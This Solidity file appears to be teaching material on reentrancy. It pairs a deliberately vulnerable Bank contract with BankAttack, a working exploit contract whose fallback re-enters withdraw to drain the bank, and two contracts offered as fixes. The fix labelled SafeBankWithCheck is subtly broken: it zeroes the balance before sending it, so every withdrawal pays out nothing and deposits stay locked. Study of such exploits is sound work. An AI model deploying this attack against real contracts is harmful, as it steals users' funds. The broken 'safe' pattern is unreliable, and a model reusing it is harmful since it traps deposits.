// SPDX-License-Identifier: UNLICENSED
pragma solidity ^0.8.20;

import {ReentrancyGuard} from "@openzeppelin/contracts/security/ReentrancyGuard.sol";

error InsufficientBalance();
error InvalidAmount();
error TransferFailed();

contract Bank {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        uint256 balance = balances[msg.sender];
        if (balance <= 0) {
            revert InsufficientBalance();
        }
        (bool sent, ) = msg.sender.call{value: balance}("");
        if (sent != true) {
            revert TransferFailed();
        }
        balances[msg.sender] = 0;
    }
}

contract SafeBankWithCheck {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public {
        // checks first
        if (balances[msg.sender] <= 0) {
            revert InsufficientBalance();
        }
        // effects second
        balances[msg.sender] = 0;
        // interactions last
        (bool success, ) = msg.sender.call{value: balances[msg.sender]}("");
        if (success != true) {
            revert TransferFailed();
        }
    }
}

// BankAttack 攻击合约
contract BankAttack {
    Bank private bank;

    fallback() external payable {
        if (address(bank).balance >= 1 ether) {
            bank.withdraw();
        }
    }

    function attack() external payable {
        if (msg.value != 1 ether) {
            revert InvalidAmount();
        }
        bank.deposit{value: 1 ether}();
        bank.withdraw();
    }

    function setBankContract(address bankContract) public {
        bank = Bank(bankContract);
    }
}

// 使用 openzeppelin 的 ReentrancyGuard
contract SafeBankWithReentrancyGuard is ReentrancyGuard {
    mapping(address => uint256) public balances;

    function deposit() public payable {
        balances[msg.sender] += msg.value;
    }

    function withdraw() public nonReentrant {
        uint256 balance = balances[msg.sender];
        if (balance <= 0) {
            revert InsufficientBalance();
        }
        balances[msg.sender] = 0;
        payable(msg.sender).transfer(balance);
    }
}
